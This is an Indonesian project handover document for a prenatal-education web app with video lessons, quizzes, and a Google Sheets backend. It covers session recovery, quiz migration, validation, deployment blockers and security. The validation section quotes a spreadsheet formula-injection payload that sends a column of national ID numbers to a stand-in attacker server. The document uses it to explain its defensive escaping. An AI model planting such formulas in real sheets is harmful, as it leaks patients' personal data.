| Siklus 1,9 detik | splash cuma 2500ms dan 700ms sudah dipakai animasi masuk, jadi tersisa ±1,8 detik. Kalau `SPLASH_DURATION_MS` dinaikkan, siklus boleh diperlambat |
| `z-index:-1` pada cincin | supaya lewat di belakang kotak, tidak menutupi ikon |
| Hemat gerak: cincin **dimatikan**, bukan dipercepat | aturan lama `animation-duration:.01ms` + `infinite` membuat cincin berkedip cepat — justru yang paling dihindari pengguna `prefers-reduced-motion`. Ikon dan teks tetap tampil normal |

**Pemulihan sesi setelah browser tertutup.** Sebelumnya seluruh `state` hanya
ada di memori — `localStorage` cuma dipakai mode offline. Jadi ibu yang keluar
dari browser kehilangan semuanya: NIK, skor pre-test, jawaban, dan yang paling
menyakitkan **progres nonton video**. Anti-skip menghitung akumulasi detik di
`tonton.akum`; kalau hilang, video 68 MB harus ditonton ulang dari nol beserta
kuotanya.

Tiga aturan yang dipatok:

| Aturan | Alasan |
|---|---|
| Berlaku **sehari saja** | Progres kemarin tidak dipulihkan — ibu datang untuk kunjungan baru, bukan melanjutkan yang lalu |
| **Ditawarkan**, tidak otomatis | Kalau HP-nya dipakai ibu lain, dia tidak boleh terjebak melanjutkan data orang |
| **Dihapus setelah tuntas** | Begitu hasil masuk sheet dan KKM tercapai, progres dibuang supaya pemulihan tidak memicu submit dobel |

Layar yang bisa dipulihkan: **S3–S7 dan S12**. S1/S2 memang awal, S8/S10/S11
sudah selesai. Kalau simpan ke server **gagal**, progres justru dipertahankan —
ibu masih bisa buka ulang dan coba kirim lagi.

Soal **tidak** ikut disimpan, dibangun ulang dari `content.js` lewat
`soalSesi()`. Yang disimpan cuma `jumlahSoal` sebagai pemeriksa: kalau bank
soalnya berubah sejak progres dibuat, jumlahnya tidak cocok lagi dan progres
dibuang — bukan dipaksa dipakai dengan jawaban yang bergeser satu.

Yang berubah:

| File | Perubahan |
|---|---|
| `app.js` | blok baru `LS_PROGRES` — `simpanProgres()`, `bacaProgres()`, `hapusProgres()` |
| `app.js` | `showScreen()` mencatat `state.layar` lalu menyimpan. Titik simpan tambahan di `pilihOpsi()`, tombol lanjut kuis, dan `bukaGate()` — pindah soal tidak memanggil `showScreen()` |
| `app.js` | `catatTonton()` menyimpan tiap 5 detik tontonan, bukan tiap pembacaan (2×/detik) |
| `app.js` | `initSplash()` menawarkan lanjut kalau ada progres hari ini. `tampilTawaranLanjut()`, `initLanjut()`, `pulihkanProgres()` baru |
| `app.js` | `gambarProgresTonton()` baru — bar tonton digambar dari nilai yang dipulihkan, bukan bar kosong yang bikin ibu ragu |
| `app.js` | tautan "Bukan saya" di S10/S11 menghapus progres sebelum reload |
| `index.html` | layar `s-lanjut` baru. Id-nya sengaja bukan `s13` supaya tidak tertukar dengan layar sertifikat yang dicabut |
| `index.html` | ikon ibu hamil di splash + header, SVG inline Material Symbols Rounded |
| `icons/favicon.svg` | ikon yang sama, kotak plum berisi bidang krem |
| `style.css` | `@keyframes halo` + `@keyframes detakHati`, `.sp-logo` diberi `position:relative`, guard hemat gerak diperluas |
| `config.js` | `KELURAHAN` + `'Luar wilayah Cakung'` |
| `gas/Code.gs` | `KELURAHAN_SAH` ikut ditambah, `versi` 6 → 7 |
| `index.html` | `style.css?v=10`, `config.js?v=10`, `app.js?v=17` |

`config.js` sempat naik ke `v=8` lalu `v=9` saat `OFFLINE_MODE` dibolak-balik
untuk uji lokal — dua angka itu pernah menyajikan isi berbeda, jadi dinaikkan
ke `v=10` supaya cache browser tidak ambigu. **`OFFLINE_MODE` sudah kembali
`false`** sebelum commit.

Verifikasi: 49 uji lolos — penjaga batas harian, versi, jumlah soal berubah,
layar akhir, isi rusak, dan konsistensi daftar kelurahan antara `config.js`
dan `Code.gs`.

### Migrasi ke folder DATA BASE VIDEO — 5 Agustus

Puskesmas mengirim `DATA BASE VIDEO-20260805T145907Z-1-001`: 6 mp4 + 9 .docx
soal. Prefiks `K.1`–`K.4` = kunjungan 1–4. Isinya:

| Kunj. | Topik | Video | Soal |
|---|---|---|---|
| 1 | Tanda Kehamilan | 9 MB | 5 |
| 1 | 1000 HPK | 51 MB | 5 |
| 2 | Gizi Ibu Hamil | 68 MB | 5 |
| 2 | Ibu KEK | 42 MB | 5 |
| 3 | Perawatan Sehari-hari | 4 MB | 5 |
| 3 | Mitos dan Fakta | **✗** | 5 |
| 4 | Hal yang Harus Dihindari | 13 MB | 5 |
| 4 | Tanda Bahaya Hamil | **✗** | 5 |
| — | Imunisasi (tanpa prefiks K) | ✗ | 5 |

**Dua topik per kunjungan, jadi 10 soal per kunjungan, bukan 5.** Ini berbeda
dari asumsi 4 Agustus. Sepuluh soal digabung jadi **satu** pre-test dan **satu**
post-test supaya struktur 13 kolom sheet tetap utuh — satu baris per kunjungan,
satu `skorPre`, satu `skorPost`. Kalau tiap topik dites terpisah, butuh 4 kolom
skor per baris dan strukturnya pecah.

Konsekuensinya poin per soal jadi 10 (bukan 20) dan skor bisa 0–100 kelipatan 10.
KKM tetap 80, sekarang berarti 8 dari 10 benar.

Yang berubah:

| File | Perubahan |
|---|---|
| `content.js` | ditulis ulang. `materi` = 6 video baru; `setSoal` = 8 set berkunci topik (`K1_TANDA_KEHAMILAN`, `K1_1000HPK`, …) menggantikan set angka 1–4 |
| `content.js` | bank soal buku fasilitator + paket TTD/MMS dipindah ke `setSoalDitahan` / `materiDitahan`, tidak dihapus |
| `content.js` | `sesi[].setSoal` sekarang **array** kunci topik, bukan angka. `bagianSoal` dicabut — tidak ada lagi pembelahan 10 soal jadi dua |
| `app.js` | `soalSesi()` menggabungkan semua set dalam array dan menempelkan `topik` ke tiap soal. `kunciSetSoal()` baru sebagai normalisasi |
| `app.js` | kartu soal berlabel topiknya sendiri, bukan gabungan nama set — satu kunjungan punya dua topik, pasien perlu tahu yang mana |
| `app.js` | `peringatanKonfigurasi()` sekarang memperingatkan kunci turunan, topik tanpa video, dan jumlah soal per sesi yang tidak sama dengan `SOAL_PER_SESI` |
| `config.js` | `SOAL_PER_SESI: 5 → 10` |
| `gas/Code.gs` | `POIN_PER_SOAL: 20 → 10` |
| `index.html` | `config.js?v=7`, `content.js?v=7`, `app.js?v=16` |

Verifikasi otomatis lolos semua: 4 sesi × 10 soal, tanpa soal terulang, semua
kunci boolean, 6 berkas media ada di disk, skor selalu kelipatan 10.

**Wilayah TTD/MMS jadi tidak relevan untuk kunjungan 1–4.** Paket baru tidak
terbagi wilayah — satu set saja. Menariknya tiga video baru identik byte-per-byte
(diverifikasi MD5) dengan varian **MMS** yang lama:

```
MMS/1-Video-Gizi-1000-Hari.mp4   = K1-Gizi-1000-HPK.mp4
MMS/3-Video-Gizi-Ibu-Hamil.mp4   = K2-Gizi-Ibu-Hamil.mp4
2-Video-Audio-KEK.mp4            = K2-KEK.mp4
```

Jadi kurasi puskesmas memakai varian MMS. Belum cukup untuk menyimpulkan Cakung
masuk program MMS — tapi satu soal K.1 ("semua ibu hamil dapat TTD") jawabannya
bergantung ini, jadi tetap perlu ditanyakan.

### Validasi ketat di Apps Script — commit `f021527`

Endpoint terbuka untuk siapa pun yang punya URL, jadi tidak boleh mempercayai
apa pun dari klien. Ditambahkan di `gas/Code.gs`:

| Fungsi | Peran |
|---|---|
| `validasiSimpan()` | periksa semua field: NIK 16 digit, nama 3–80 tanpa HTML/URL, WA `^0\d{8,14}$`, alamat 5–200, kelurahan & puskesmas harus dari daftar resmi, kunjungan 1–10, skor 0–100 kelipatan `POIN_PER_SOAL` |
| `amanTeks()` | netralkan injeksi formula Sheets — nilai berawalan `=` `+` `-` `@` diberi prefiks apostrof |
| `tanpaApostrof()` | lepas prefiks itu saat data dibaca kembali ke aplikasi |
| `dalamRentang()` | clamp `kkm` dan `totalSesi`, supaya klien tidak bisa kirim `kkm=0` agar semua LULUS |
| `lolosThrottle()` | batas 40 simpan / 10 menit lewat `ScriptProperties`, dipanggil di dalam lock |
| `ujiValidasi()` | 16 payload buruk dilempar ke validator, tidak menulis apa pun ke sheet |

Urutan di `handleSave`: validasi (di luar lock, murni hitungan) → lock →
`bedaHeader` → throttle → tulis.

Injeksi formula itu risiko nyata justru karena bidan membuka spreadsheet.
Payload `=IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50),"//a")`
di kolom Nama bisa mengirim seluruh kolom NIK keluar begitu file dibuka.

Di `index.html`, input Nama diberi `maxlength="80"` dan Alamat `maxlength="200"`
supaya form tidak bisa menghasilkan nilai yang ditolak server.

### 5 soal per sesi, KKM 80 — commit `1c4463c`

Klien konfirmasi tiap sesi hanya 5 soal dan lulus 4 dari 5. Buku fasilitator
berisi 10 soal per pertemuan, jadi tiap set dibelah lewat `bagianSoal`:

| Sesi | Set buku | Bagian | Soal buku |
|---|---|---|---|
| 1 · Kehamilan Sehat | Pertemuan I | 1 | 1–5 |
| 2 · Pemeriksaan & Gizi | Pertemuan I | 2 | 6–10 |
| 3 · Perawatan Diri | Pertemuan III | 1 | 1–5 |
| 4 · Tanda Bahaya | Pertemuan III | 2 | 6–10 |

Sebelumnya sesi 1 & 2 memakai set yang sama persis sehingga soalnya terulang.
Sekarang tidak — sudah diuji, sesi 1–4 dapat 5 soal masing-masing tanpa
tumpang tindih, di wilayah TTD maupun MMS.

Skala skor jadi kelipatan 20: `0, 20, 40, 60, 80, 100`. Yang berubah:

- `config.js` → `SOAL_PER_SESI: 5` (baru), `KKM: 75 → 80`
- `app.js` → `soalSesi()` memotong 5 soal, `namaSet()` menyebut rentang soalnya
- `gas/Code.gs` → `POIN_PER_SOAL: 10 → 20`, `KKM_DEFAULT: 75 → 80`
- `hitungSkor()` **tidak disentuh** — rumusnya `benar / soal.length × 100`, otomatis ikut

### Favicon — commit `9635e73`

`icons/favicon.svg`, ikon Lucide `baby` yang sama dengan splash screen. Digambar
sebagai kotak berisi `#b03a5b` dengan bayi krem di atasnya, karena garis tipis
Lucide nyaris tidak terlihat di ukuran 16px dan warnanya ambigu di tab gelap
maupun terang. Path diverifikasi 4 dari 4 cocok dengan rilis Lucide resmi.

Catatan: `apple-touch-icon` diarahkan ke SVG yang sama, tapi Safari tidak
mendukung SVG untuk ikon home-screen. Kalau nanti perlu, butuh PNG 180×180
plus `manifest.json` agar jadi PWA.

---

## 5. Blocker — aplikasi belum bisa dipakai pasien

### 5.1 ~~Kunci jawaban belum diverifikasi~~ — SELESAI 9 Agustus

**Blocker ini sudah tidak ada.** Paket 9 Agustus memuat kunci jawaban resmi
yang ditandai huruf tebal. Seluruh 45 kunci set aktif sekarang resmi, bukan
turunan. Rinciannya di `KUNCI-JAWABAN.md`.

Yang tersisa dari topik ini, jauh lebih kecil:

1. **K.3 Mitos dan Fakta no. 1** — kunci resmi "Salah" untuk *"wajib periksa
   hamil rutin"*, bertentangan dengan no. 5 di set yang sama. Ditulis apa
   adanya, ditandai `perluKonfirmasi`. Perlu ditanyakan ke bidan
2. **Imunisasi** — kuncinya masih turunan, dan topiknya masih ditahan karena
   belum jelas masuk kunjungan ke berapa

Catatan riwayat di bawah disimpan sebagai alasan kenapa kunci jawaban konten
kesehatan tidak boleh diturunkan sendiri.

<details>
<summary>Riwayat: dua kunci turunan yang terbukti keliru</summary>

Sebelum 9 Agustus, kunci diturunkan dari pedoman Buku KIA karena berkas sumber
tidak memuatnya. 38 dari 40 cocok dengan kunci resmi. Dua yang salah:

| Soal | Kunci turunan | Kunci resmi |
|---|---|---|
| K.1 Tanda Kehamilan no. 4 — *"trimester kedua 1 kali"* | Benar | **Salah** |
| K.2 KEK no. 5 — *"mual dan tidak nafsu makan menyebabkan KEK"* | Benar | **Salah** |

Yang pertama sudah ditandai perlu konfirmasi karena bergantung pedoman. Yang
kedua sebelumnya dinilai "tidak ambigu" — penilaian itu yang salah.

</details>

### 5.2 ~~Dua topik tanpa video~~ — SELESAI 9 Agustus

Paket 9 Agustus mengirim `K3-Mitos-dan-Fakta.mp4` (20 MB) dan
`K4-Tanda-Bahaya.mp4` (14 MB). Video anemia untuk topik baru K.3 Anemia
diambil dari EduCatin atas instruksi klien.

**Semua 9 topik aktif sekarang punya videonya.** Tidak ada lagi pasien yang
diuji tanpa materi. Penanda `tanpaVideo` di `content.js` sudah dicabut.

Kandidat lama `TTD/7-Video-TTD-Mitos-dan-Fakta.mp4` (99 MB) tidak dipakai —
puskesmas mengirim videonya sendiri, dan isi soal Mitos juga sudah berganti
dari mitos TTD ke mitos kehamilan.

### 5.3 ~~Deployment Apps Script tertinggal dari repo~~ — SELESAI 9 Agustus

Deployment dan repo dua-duanya `versi: 12`, diverifikasi lewat `?action=ping`.

**Ini persoalan yang paling sering kambuh di proyek ini** — selisihnya muncul
berulang: `versi: 5` → 7 → 8 → 9 → 10 → 12, dan dalam satu hari saja (9 Agustus)
sempat terbuka-tutup dua kali. Pola kegagalannya selalu sama: file di-Save di
editor Apps Script tapi **Deploy → Manage deployments → New version** tidak
dijalankan, sehingga URL yang dipakai aplikasi tetap menyajikan kode lama.

Karena itu perlakukan setiap perubahan `gas/Code.gs` sebagai **dua langkah,
bukan satu**: ubah repo, LALU deploy.

Cara memastikan, bukan berasumsi: `?action=ping` harus membalas nomor `versi`
yang sama dengan yang ada di `gas/Code.gs`. Dua kali dalam sesi 9 Agustus,
uji yang menunjukkan perilaku tidak berubah sama sekali-lah yang mengungkap
Save-tanpa-deploy — bukan pemeriksaan versi, karena versinya belum dilihat.

Yang akhirnya terbawa deploy versi 10 dan 12:

1. `KELURAHAN_SAH` + "Luar wilayah Cakung"
2. **Perampingan `handleSave`** — 4 pembacaan sheet penuh jadi 1. Ini yang
   bikin "Menyimpan hasil..." lama. Perbaikan sisi frontend (pra-ambil
   riwayat, pemanasan container) sudah jalan begitu di-push, tidak menunggu
   deploy
3. `BATAS.POIN_PER_SOAL` dicabut → skor 15 soal (7, 13, 27, 33, …) diterima
4. Skor kosong ditolak, tidak lagi ditulis 0 diam-diam
5. `PUSKESMAS_SAH` + "Klinik/Praktik Bidan"

Riwayatnya panjang karena selisih ini muncul berulang: `versi: 5` → 7 → 8 → 9
→ 10. Pola kegagalannya selalu sama — file di-Save di editor Apps Script tapi
**Deploy → Manage deployments → New version** tidak dijalankan, sehingga URL
yang dipakai aplikasi tetap menyajikan kode lama. Dua kali dalam sesi 9 Agustus
uji menunjukkan perilaku yang tidak berubah sama sekali, dan itu yang
mengungkap Save-tanpa-deploy.

Cara memastikan, bukan berasumsi: `?action=ping` harus membalas nomor `versi`
yang sama dengan yang ada di `gas/Code.gs`. Kalau beda, deployment tertinggal.

Yang akhirnya terbawa deploy versi 9 dan 10:

1. `KELURAHAN_SAH` + "Luar wilayah Cakung"
2. **Perampingan `handleSave`** — 4 pembacaan sheet penuh jadi 1. Ini yang
   bikin "Menyimpan hasil..." lama. Perbaikan sisi frontend (pra-ambil
   riwayat, pemanasan container) sudah jalan begitu di-push, tidak menunggu
   deploy
3. `BATAS.POIN_PER_SOAL` dicabut → skor 15 soal (7, 13, 27, 33, …) diterima
4. Skor kosong ditolak, tidak lagi ditulis 0 diam-diam

### 5.4 Duplikat media 160 MB

Tiga berkas paket lama identik byte-per-byte dengan berkas baru (lihat bagian 4).
`MMS/1-Video-Gizi-1000-Hari.mp4`, `MMS/3-Video-Gizi-Ibu-Hamil.mp4`, dan
`2-Video-Audio-KEK.mp4` boleh dihapus untuk menghemat 160 MB disk. Tidak dihapus
sendiri karena `media/` isinya aset klien.

---

## 6. Menunggu jawaban puskesmas

| # | Hal | Kondisi sekarang |
|---|---|---|
| 1 | **K.3 Mitos dan Fakta no. 1** | kunci resmi "Salah" untuk *"wajib periksa hamil rutin"*, bertentangan dengan no. 5 di set yang sama. Ditulis apa adanya, ditandai `perluKonfirmasi`. Lihat 5.1 |
| 2 | ~~Video Mitos dan Fakta~~ | **SELESAI** — dikirim di paket 9 Agu |
| 3 | ~~Video Tanda Bahaya~~ | **SELESAI** — dikirim di paket 9 Agu |
| 4 | Soal "Imunisasi" masuk kunjungan ke berapa | berkasnya tanpa prefiks K, dan paket 9 Agu tidak menyertakannya. Kuncinya masih turunan. Ditahan di `setSoalDitahan` |
| 5 | Wilayah **TTD atau MMS** | tidak memengaruhi materi maupun kunci lagi — paket 9 Agu satu set dan kuncinya sudah resmi. `config.js` masih `TTD`, sekarang tidak berdampak |
| 6 | Kunjungan 5+ | puskesmas baru mengirim K.1–K.4. `sesiDitahan` sekarang kosong |
| 7 | Template pesan WhatsApp | dikarang sendiri |
| 8 | ~~Revisi "puskesmas tempat periksa"~~ | **SELESAI 9 Agu.** Labelnya sekarang "Tempat Periksa" dan daftarnya 10 opsi termasuk "Klinik/Praktik Bidan". Tidak ada field baru, jadi struktur 13 kolom utuh. `PUSKESMAS_SAH` di `Code.gs` harus selalu identik dengan `PUSKESMAS` di `config.js` — uji otomatis sudah memeriksa ini |
| 9 | ~~Link grup WhatsApp kelas ibu hamil online~~ | **SELESAI 9 Agu** — commit `fb1b72c`, note di S8 + S12, `WA_GRUP_LINK` di `config.js`. Sisa tindakan admin grup: nyalakan "Setujui anggota baru", lihat bagian 8 |
| 10 | **Rujukan halaman Buku KIA per topik** | satu-satunya revisi klien yang belum dikerjakan. Butuh 8 nomor halaman dari bidan — tidak boleh dikarang. Plus keputusan: apakah baca Buku KIA membuka post-test? Kalau ya, anti-skip jadi sia-sia; kalau tidak, manfaatnya kecil |

Konten kesehatan tidak pernah dikarang. Kunci jawaban diturunkan karena berkas
sumber memang tidak memuatnya, dan semuanya ditandai untuk diverifikasi — bukan
dianggap final.

---

## 7. Yang perlu dilakukan user

| # | Tindakan | Catatan |
|---|---|---|
| 1 | ~~Deploy `Code.gs` ke `versi: 12`~~ | **SELESAI 9 Agu.** Diverifikasi: `?action=ping` balas `versi: 12`, dan seluruh 10 opsi tempat periksa diuji satu per satu ke endpoint hidup — semuanya diterima |
| 2 | Laporkan kode galat video 1000 HPK | buka videonya, layar sekarang menampilkan kode MediaError-nya. Berkas sudah terbukti sehat, jadi kodenya yang menentukan langkah berikutnya — lihat ronde 3 di bagian 4 |
| 3 | Jalankan `hapusUji()` di Apps Script | **belum.** Ada 8 baris uji NIK `9999999999999999` (kunjungan 1–6, 8, 9) dari uji 9 Agu. `hapusUji()` hanya menyapu baris yang NIK **dan** namanya cocok `UJI COBA - HAPUS`, jadi data ibu asli aman |
| 4 | Nyalakan "Setujui anggota baru" di grup WhatsApp | lihat bagian 8. Kalau belum, kosongkan `WA_GRUP_LINK` dulu |
| 5 | Jawab 1 revisi yang tersisa | lihat bagian 6 no. 10 — rujukan halaman Buku KIA. No. 8 dan 9 sudah selesai |
| 5b | ~~Tanya bidan soal K.3 Mitos no. 1~~ | **klien memilih mengabaikan 9 Agu.** Kunci resmi puskesmas dipakai apa adanya. Penanda `perluKonfirmasi` hanya muncul di `console.warn`, tidak terlihat ibu — tidak ada dampak ke alur |
| 5 | Konfirmasi judul sesi 5–10 | diambil dari nama slide deck, belum tentu sejajar dengan penomoran K.1–K.4 |
| 6 | Ganti deployment Apps Script atau jadikan repo private | **sebelum** dipakai pasien nyata |
| 7 | Tulis batas scope + termin bayar ke klien | lihat bagian 9 |
| 8 | Hapus 3 video duplikat (160 MB) | opsional, lihat 5.4 |
| 9 | Pindahkan repo keluar folder kantor | opsional, lihat bagian 8 |

**Sudah selesai 9 Agustus:**

- Deploy `Code.gs` ke `versi: 10` lalu `versi: 12` — dua-duanya terverifikasi
  live. Pada versi 10: seluruh 16 kemungkinan skor 15 soal diterima, skor
  kosong ditolak, tidak ada baris duplikat pada 5 submit bersamaan. Pada
  versi 12: seluruh 10 opsi tempat periksa diterima, opsi lama yang sudah
  dihapus ditolak
- Note grup WhatsApp di S8 + S12
- Ikon splash diperbesar 42px → 62px
- Nomor WhatsApp laporan diganti jadi `6285945371933`
- Opsi tempat periksa "Klinik/Praktik Bidan", label jadi "Tempat Periksa"
- Pesan galat video membedakan empat kode `MediaError`

**Sudah selesai 6–7 Agustus:**

- Deploy Apps Script skala skor baru — terverifikasi live: 70 dan 90 diterima,
  75 ditolak `"Post-Test harus kelipatan 10"`
- Hosting video — 6 berkas K1–K4 (186 MB) ikut repo di commit `4c5a265`,
  `.gitignore` diubah jadi whitelist
- GitHub Pages aktif — `index.html` balas 200
- Jalur simpan dari origin `github.io` diuji tulis-lalu-baca: CORS beres
  (`Access-Control-Allow-Origin: *` di dua hop), baris mendarat di sheet.
  Laporan "data tidak masuk sheet" ternyata karena `OFFLINE_MODE` sempat
  disetel `true` untuk uji lokal — bukan cacat aplikasi
- Ronde 1 revisi klien: kelurahan luar wilayah, ikon ibu hamil, animasi
  splash, pemulihan sesi setelah browser tertutup

---

## 8. Keamanan dan lingkungan

**Endpoint terbuka.** URL Web App memberi akses tulis ke sheet bagi siapa pun
yang memilikinya. Aplikasi statis berarti URL selalu terlihat di DevTools, dan
repo publik berarti bisa ditemukan pemindai otomatis GitHub.

Selama masa uji risiko ini diterima user. Peredam yang sudah dipasang (validasi,
clamp, throttle, anti-injeksi) hanya mencegah data ngawur dan banjir — **bukan
menutup akses**. Sebelum pasien nyata, lakukan salah satu:

- Apps Script → Deploy → Manage deployments → Edit → New version (URL berubah,
  lalu perbarui `SHEETS_ENDPOINT` di `config.js`)
- atau jadikan repo private

**Tautan grup WhatsApp publik.** Sejak commit `fb1b72c`, `WA_GRUP_LINK` di
`config.js` memuat tautan undangan grup. Repo publik berarti tautan itu publik
— siapa pun yang menemukannya bisa mencoba bergabung. Di dalam grup WhatsApp
nomor HP antar anggota saling terlihat, dan itu data ibu hamil.

Sebelum dipakai pasien nyata, admin grup **wajib** menyalakan Setelan grup →
Setujui anggota baru. Kalau belum, kosongkan `WA_GRUP_LINK` — note-nya otomatis
hilang tanpa perlu menyentuh HTML atau JS.

`isiNoteGrup()` di `app.js` menyaring tautan dengan regex
`^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$`. Yang ditolak antara lain
`http` biasa, domain menyamar seperti `chat.whatsapp.com.evil.com`, skema
`javascript:`, dan `wa.me` (chat pribadi, bukan grup). Alasannya: yang mengklik
adalah ibu hamil yang percaya tautan itu dari puskesmas, jadi salah tulis di
config tidak boleh berubah jadi tautan ke tempat lain.

**NIK disimpan mentah** sesuai struktur yang diminta puskesmas. Spreadsheet
jangan pernah dibagikan dengan opsi "anyone with the link" — share ke akun bidan
tertentu saja. Di pesan WhatsApp NIK ditampilkan tersamar (`3175••••••••1234`).

**Repo masih di dalam folder kantor.** `c:\KIRO AKUH\sinta\` remote-nya GitLab
kantor (`mitrakeluarga/sinta`), dan KIARA jadi repo terpisah di dalamnya.
Identitas git lokal KIARA sudah di-set ke akun pribadi
(`iamsleepyhead00 <iamsleepyhead00@users.noreply.github.com>`) — **sengaja tidak
memakai identitas kantor** yang ada di repo induk. Config global mesin tidak
disentuh. `media/` (1.122 MB) sudah diverifikasi tidak ikut ter-push.

---

## 9. Catatan komersial

Penawaran awal 4jt → didiskon 3jt → klien menawar **1jt** (setara Rp 95rb/hari
untuk 10,5 hari kerja). User mengambil proyeknya karena butuh cash.

**Belum dilakukan:** menulis batas scope dan termin bayar ke klien di WhatsApp.
Ini makin relevan karena scope sudah bertambah banyak sejak kesepakatan 1jt:
anti-skip video, validasi ketat backend, migrasi struktur 13 kolom, perombakan
tampilan, ganti skema soal jadi 5/KKM 80, favicon.

Semua itu di luar penawaran awal. Tanpa batas tertulis, permintaan berikutnya
akan dianggap "masih termasuk". Minimal tulis: apa yang masuk, apa yang di luar
(sertifikat, upload video, revisi materi), dan DP 50%.

Klien tidak paham IT, jadi saran sebelumnya: tanyakan asal angka 1jt — kemungkinan
itu plafon mekanisme pembayaran, bukan plafon nilai proyek.

---

## 10. Konvensi kerja

- Balas dalam **Bahasa Indonesia informal**, sapaan "lu/gw"
- Jangan bertele-tele, tapi tetap teliti
- **Jangan menambahkan file uji permanen.** Buat file `_*.js` atau `_*.ps1`
  sementara, jalankan, lalu hapus
- Output PowerShell sering terpotong — tulis hasil ke file lalu `Get-Content`
- Uji endpoint Apps Script pakai `curl.exe -sL`, **bukan** `Invoke-RestMethod`
  (balas 404 palsu untuk request berparameter)
- Google kadang membalas halaman HTML "Halaman Tidak Ditemukan" alih-alih JSON.
  Itu gangguan sesaat, ulangi requestnya
- Naikkan `?v=` di `index.html` setiap JS/CSS berubah. Sekarang:
  `style.css?v=11`, `config.js?v=12`, `content.js?v=9`, `visit-tracker.js?v=5`,
  `app.js?v=20`
- **Jangan mengarang konten kesehatan.** Kunci jawaban yang terlihat keliru
  ditulis apa adanya lalu ditandai `perluKonfirmasi`
- Jangan pakai identitas git kantor untuk repo pribadi user
- Jangan mengubah struktur 13 kolom sheet
- PowerShell membalas exit code 1 saat `git push` walau berhasil — itu kuirk
  penanganan stderr, cek `main ->` di outputnya

---

## 11. Peta file

| File | Isi |
|---|---|
| `index.html` | 12 layar (S1–S12) + `s-lanjut` (tawaran melanjutkan sesi tertunda) + `s-belum` (sesi 5–10 belum tersedia) |
| `icons/favicon.svg` | ikon ibu hamil (Material Symbols Rounded) dalam kotak plum |
| `style.css` | palet plum-wine `#b03a5b`, 9 token ukuran teks (`--t-micro` … `--t-logo`) |
| `config.js` | satu-satunya file yang perlu diubah saat deploy |
| `content.js` | peta kunjungan 1–4, 6 video, 8 set soal ×5, `materiDitahan` + `setSoalDitahan` (paket lama & buku fasilitator), template WA |
| `visit-tracker.js` | lookup/save, mode offline, validasi NIK & HP |
| `app.js` | seluruh logika layar, `soalSesi()`, `hitungSkor()`, anti-skip |
| `gas/Code.gs` | backend Apps Script, validasi, uji `ujiTulis`/`ujiBaca`/`ujiValidasi`/`hapusUji` |
| `icons/favicon.svg` | ikon bayi untuk tab |
| `STRUKTUR-GOOGLE-SHEET.md` | 13 kolom, aturan validasi, 9 rumus rekap untuk bidan |
| `BATAS-MEDIA-GITHUB.md` | batas GitHub + hitungan bandwidth paket 186 MB, alasan video ikut repo, opsi cadangan YouTube/R2. Analisis paket lama disimpan sebagai riwayat |
| `KUNCI-JAWABAN.md` | 45 kunci resmi per kunjungan + riwayat dua kunci turunan yang keliru. Menggantikan `KUNCI-JAWABAN-PERLU-VERIFIKASI.md` |
| `README.md` | ikhtisar, alur layar, tabel pertanyaan terbuka |
| `media/` | 6 video aktif (186 MB) + 11 video paket lama, **semua tidak ikut git** |
